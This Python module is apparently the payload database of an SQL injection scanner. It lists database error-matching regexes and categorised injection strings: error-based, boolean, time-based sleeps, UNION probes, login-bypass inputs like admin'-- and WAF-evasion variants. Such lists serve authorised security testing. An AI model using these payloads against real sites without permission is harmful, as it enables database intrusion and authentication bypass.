"""
SQL Injection Payload Database - Shadow Spike SQLi Scanner
Categorized list of payloads for Error-based, Time-based, and Boolean-based SQLi.
"""
from typing import List, Dict

# Error-based detection regexes for various databases
SQL_ERRORS: Dict[str, List[str]] = {
    "MySQL": [
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysql_.*?",
        r"valid MySQL result",
        r"MySqlClient\.",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*?ERROR",
        r"Warning.*?pg_.*?",
        r"valid PostgreSQL result",
        r"Npgsql\.",
    ],
    "Microsoft SQL Server": [
        r"Driver.*? SQL[\-\_\ ]*Server",
        r"OLE DB.*? SQL Server",
        r"SQL Server.*?Driver",
        r"Warning.*?mssql_.*?",
        r"SqlException",
    ],
    "Oracle": [
        r"ORA-[0-9]{5}",
        r"Oracle error",
        r"Oracle.*?Driver",
        r"Warning.*?oci_.*?",
    ],
    "Generic": [
        r"SQL syntax",
        r"sqlite3.OperationalError",
        r"unexpected end of SQL command",
        r"invalid input syntax for type",
    ]
}

SQLI_PAYLOADS: Dict[str, List[str]] = {
    "error_based": [
        "'", "\"", "\\", "')", "\"))", "';", "\";", "`", "`)", "]]", "'))",
        "extractvalue(1,concat(0x7e,version()))",
        "updatexml(1,concat(0x7e,version()),1)",
        "(SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT (ELT(1,1))), 0x7e, FLOOR(RAND(0)*2)) AS x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) AS y)",
        "convert(int,@@version)",
        "cast((select @@version) as int)",
        "1/0",
        "AND 1=(SELECT COUNT(*) FROM tablename); --",
        "ctxsys.drithsx.sn(1,user)",
    ],
    "boolean_based": [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 1=1#",
        "\" OR 1=1#",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' AND 1=1--",
        "' AND 1=2--",
        "\" AND 1=1--",
        "\" AND 1=2--",
        "' OR (SELECT 1)=1--",
        "' OR (SELECT 1)=0--",
        " AND (SELECT 1)=1",
        " AND (SELECT 1)=0",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:10'--",
        "'); WAITFOR DELAY '0:0:10'--",
        "'; SELECT pg_sleep(10)--",
        "'; SELECT SLEEP(10)--",
        "\" AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--",
        "' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--",
        "X' OR 1=1 AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--",
        "(SELECT * FROM (SELECT(SLEEP(10)))a)",
        "benchmark(10000000,md5(1))",
    ],
    "union_based": [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 'a','b','c'--",
        "\" UNION SELECT 1,2,3--",
        "1 UNION SELECT 1,2,3--",
        "' UNION ALL SELECT 1,2,3--",
    ],
    "waf_bypass": [
        "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3",
        "UNI/**/ON SEL/**/ECT 1,2,3",
        "uNiOn sElEcT 1,2,3",
        "%27%20OR%201%3D1",
        "%%27%%20OR%%201%%3D1",
        "Admin'--",
        "' or 1=1 limit 1 -- -+",
        "'||'1'='1",
        "'||(SELECT 'a')='a'",
        "'+OR+'1'='1",
        "\"+OR+\"1\"=\"1",
        "1' OR 1=1 UNION SELECT 1,@@version --",
        "0x27204f5220313d31", # Hex encoded ' OR 1=1
    ]
}

# Flatten for quick scans
ALL_SQLI_PAYLOADS = [p for cat in SQLI_PAYLOADS.values() for p in cat]
